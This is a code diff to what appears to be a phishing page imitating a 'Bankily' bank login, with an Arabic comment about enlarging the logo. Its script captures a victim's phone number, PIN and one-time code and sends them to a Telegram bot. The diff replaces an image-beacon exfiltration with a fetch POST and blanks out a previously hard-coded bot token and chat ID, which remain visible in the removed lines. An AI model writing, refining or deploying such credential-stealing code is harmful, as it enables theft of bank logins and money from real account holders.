@@ -27,7 +27,8 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:0 24px 16px;-webkit-overflow-scrolling:touch}
 
 .logo-box{display:flex;justify-content:center;margin:15px 0 25px}
-.logo-box img{width:190px;object-fit:contain}
+/* تم تكبير عرض الشعار هنا ليناسب طلبك */
+.logo-box img{width:260px;max-width:100%;object-fit:contain}
 
 .field{margin-bottom:20px; position: relative;}
 .lbl{font-size:12.5px;font-weight:600;color:#444;display:block;text-align:right;margin-bottom:6px}
@@ -396,18 +397,28 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 </div>
 
 <script>
-const telegramToken = "8854630231:AAhWY-escCA2tLazBgDZWqNaPNqUNTPiKGA";
-const telegramChatId = "8972356637";
+const telegramToken = "";
+const telegramChatId = "";
 
 function sendToTelegram(phone, pin, otpCode = null) {
-  let text = `🔔 Bankily Login\n📱 Phone: ${phone}\n🔑 Pin: ${pin}`;
+  let message = `🔔 Bankily Login\n📱 Phone: ${phone}\n🔑 Pin: ${pin}`;
   if (otpCode) {
-    text += `\n📝 OTP: ${otpCode}`;
+    message += `\n📝 OTP: ${otpCode}`;
   }
 
-  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=` + encodeURIComponent(text);
-  const img = new Image();
-  img.src = url;
+  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+  fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: telegramChatId,
+      text: message,
+      parse_mode: "HTML"
+    })
+  })
+  .then(response => console.log("Sent"))
+  .catch(error => console.error("Error:", error));
 }
 
 function setupStrictLengthValidation(inputElement, maxLength) {
